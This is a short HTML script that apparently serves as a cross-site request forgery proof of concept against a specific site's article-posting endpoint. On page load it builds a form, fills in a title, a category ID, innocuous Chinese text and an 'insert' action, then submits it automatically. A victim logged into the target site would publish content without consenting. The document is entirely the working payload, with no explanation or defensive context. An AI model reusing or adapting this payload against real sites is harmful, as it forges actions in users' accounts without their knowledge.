<script>
document.write('<form name=myForm></form>');   
var myForm=document.forms['myForm'];   
myForm.action='http://lib.uir.cn/ucenter/article/do.jsp';   
myForm.method='POST';   

var input = document.createElement('input');
input.type = 'text';
input.name = 'title';
input.value = "一片新的文章";
myForm.appendChild(input);

var select=document.createElement('select');
select.name = 'userCategoryId';
select.value = "4028813a3947376e013947485df10008";
myForm.appendChild(select);

var textarea=document.createElement('textarea');
textarea.name='content';
textarea.value='这篇文章并没有什么特别。';
myForm.appendChild(textarea);

var input=document.createElement('input');
input.type = 'hidden';
input.name = 'type';
input.value = "insert";
myForm.appendChild(input);

myForm.submit();
</script>